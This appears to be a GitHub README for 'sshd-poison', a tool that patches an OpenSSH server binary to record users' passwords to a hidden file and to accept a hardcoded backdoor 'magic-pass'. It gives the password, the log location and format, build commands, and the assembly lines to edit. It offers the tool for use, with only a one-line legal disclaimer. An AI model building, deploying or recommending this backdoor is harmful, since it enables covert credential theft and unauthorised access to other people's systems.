sshd-poison
===========

sshd-poison is a tool that modifies a sshd binary to capture password-based authentications and allows you to login in some accounts using a magic-pass.

This only works with x86_64-elf file. Should work with openssh 7.7p1 up to 8.3p1. The code need some modifications to work with older versions.

OpenSSH versions tested:

* OpenSSH_7.9p1 Debian-10+deb10u2, OpenSSL 1.1.1d  10 Sep 2019
* OpenSSH_8.3p1, OpenSSL 1.1.1g  21 Apr 2020


Magic-pass
----------

Unhappily, the power of this magic is a bit limited.
If you try login as root, and root login is not allowed, or if the user isn't valid, it won't work.

magic-pass is ```anneeeeeeeeeeee```.

Logfile
-------

Captured passwords are stored in ```/tmp/.nothing```.

The strings are saved in reverse order in the following format: ```\0password\0user\0ip```, or rather ```\0drowssap\0resu\0pi```.

Compiling
---------

```
$ git clone --recurse-submodules https://github.com/hc0d3r/sshd-poison
$ cd sshd-poison
$ make
```

If you want a different magic-pass/logfile, edit the following lines in **sc.asm**.

```sh
magic_pass: db 'anneeeeeeeeeeee', 0x0
logfile: db '/tmp/.nothing', 0x0
```

Demo
----

![](https://raw.githubusercontent.com/hc0d3r/sshd-poison/media/demo.gif)

Legal disclaimer
----------

Use for illegal purposes are not allowed.

Contributing
------------
You can help with code, or donating money.
If you wanna help with code, use the kernel code style as a reference.

Paypal: [![](https://www.paypalobjects.com/en_US/i/btn/btn_donate_SM.gif)](https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=RAG26EKAYHQSY&currency_code=BRL&source=url)

BTC: 19p3bnJ1t7DByfD8LdgU6WRSnUc2ftBxkP
